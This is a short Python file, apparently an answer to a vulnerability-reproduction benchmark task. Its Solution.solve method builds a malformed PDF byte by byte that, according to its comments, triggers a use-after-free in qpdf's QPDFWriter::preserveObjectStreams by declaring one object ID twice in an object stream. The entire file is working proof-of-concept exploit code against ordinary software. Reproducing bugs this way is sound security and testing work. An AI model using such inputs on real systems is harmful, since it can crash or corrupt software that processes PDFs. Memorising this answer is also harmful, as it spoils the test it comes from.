import sys

class Solution:
    def solve(self, src_path: str) -> bytes:
        # Construct a PDF that triggers the UAF in QPDFWriter::preserveObjectStreams
        # caused by duplicate object IDs in an object stream.
        
        header = b"%PDF-1.5\n%\xe2\xe3\xcf\xd3\n"
        pdf = bytearray(header)

        def current_off():
            return len(pdf)

        # 1: Catalog
        o1_off = current_off()
        pdf.extend(b"1 0 obj\n<< /Type /Catalog /Pages 2 0 R >>\nendobj\n")

        # 2: Pages
        o2_off = current_off()
        pdf.extend(b"2 0 obj\n<< /Type /Pages /Count 1 /Kids [3 0 R] >>\nendobj\n")

        # 3: Page (Referencing 6 as an annotation to ensure it is processed)
        o3_off = current_off()
        pdf.extend(b"3 0 obj\n<< /Type /Page /Parent 2 0 R /Contents 4 0 R /Annots [6 0 R] >>\nendobj\n")

        # 4: Content Stream
        o4_off = current_off()
        pdf.extend(b"4 0 obj\n<< /Length 0 >>\nstream\nendstream\nendobj\n")

        # 5: Object Stream with duplicate object ID 6
        # This is the core trigger. The stream defines ID 6 twice.
        # Header pairs: 6 0 6 6
        # Stream data start offset (/First): 8 (length of "6 0 6 6" + 1 for newline)
        # Content: "<< >> << >>"
        # Object 6 #1 at index 0 (relative to data start) -> "<< >>"
        # Object 6 #2 at index 6 (relative to data start) -> "<< >>" (Duplicate ID)
        o5_off = current_off()
        stm_content = b"6 0 6 6\n<< >> << >>"
        o5_head = b"5 0 obj\n<< /Type /ObjStm /N 2 /First 8 /Length " + str(len(stm_content)).encode() + b" >>\nstream\n"
        pdf.extend(o5_head)
        pdf.extend(stm_content)
        pdf.extend(b"\nendstream\nendobj\n")

        # 7: XRef Stream
        # Maps objects 1-5 to their offsets, 6 to ObjStm 5, 7 to self.
        x_off = current_off()
        xdata = bytearray()
        
        # Entry 0: Free
        xdata.extend(b"\x00\x00\x00\x00")
        
        # Entries 1-5: Type 1 (Uncompressed)
        for off in [o1_off, o2_off, o3_off, o4_off, o5_off]:
            xdata.extend(b"\x01" + off.to_bytes(2, 'big') + b"\x00")
            
        # Entry 6: Type 2 (Compressed), Stream 5, Index 0
        xdata.extend(b"\x02\x00\x05\x00")
        
        # Entry 7: Type 1 (Uncompressed), Self
        xdata.extend(b"\x01" + x_off.to_bytes(2, 'big') + b"\x00")
        
        # XRef Stream Dictionary
        x_dict = b"7 0 obj\n<< /Type /XRef /Size 8 /W [1 2 1] /Root 1 0 R /Length " + str(len(xdata)).encode() + b" >>\nstream\n"
        pdf.extend(x_dict)
        pdf.extend(xdata)
        pdf.extend(b"\nendstream\nendobj\n")

        # Trailer
        pdf.extend(b"startxref\n" + str(x_off).encode() + b"\n%%EOF\n")

        return bytes(pdf)
